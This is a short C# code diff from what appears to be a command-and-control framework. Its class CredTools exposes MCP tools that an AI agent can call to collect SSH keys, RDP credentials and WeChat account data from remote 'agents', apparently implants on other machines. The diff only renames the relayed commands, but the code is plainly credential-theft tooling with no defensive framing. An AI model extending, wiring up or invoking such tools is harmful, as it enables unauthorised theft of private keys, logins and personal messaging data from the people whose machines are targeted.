@@ -15,7 +15,7 @@ public sealed class CredTools
         AgentService agents,
         [Description("Target agent ID")] string agentId)
     {
-        return await McpUtils.RelayOrError(relay, agents, agentId, "othersoft.rdp", null, TimeSpan.FromSeconds(45));
+        return await McpUtils.RelayOrError(relay, agents, agentId, "creds", new { op = "rdp" }, TimeSpan.FromSeconds(45));
     }
 
     [McpServerTool, Description("Collect SSH keys from an agent (~/.ssh)")]
@@ -24,7 +24,7 @@ public sealed class CredTools
         AgentService agents,
         [Description("Target agent ID")] string agentId)
     {
-        return await McpUtils.RelayOrError(relay, agents, agentId, "othersoft.ssh", null, TimeSpan.FromSeconds(30));
+        return await McpUtils.RelayOrError(relay, agents, agentId, "creds", new { op = "ssh" }, TimeSpan.FromSeconds(30));
     }
 
     [McpServerTool, Description("List WeChat account data directories on an agent")]
@@ -33,6 +33,6 @@ public sealed class CredTools
         AgentService agents,
         [Description("Target agent ID")] string agentId)
     {
-        return await McpUtils.RelayOrError(relay, agents, agentId, "othersoft.wechat", null, TimeSpan.FromSeconds(30));
+        return await McpUtils.RelayOrError(relay, agents, agentId, "creds", new { op = "wechat" }, TimeSpan.FromSeconds(30));
     }
 }
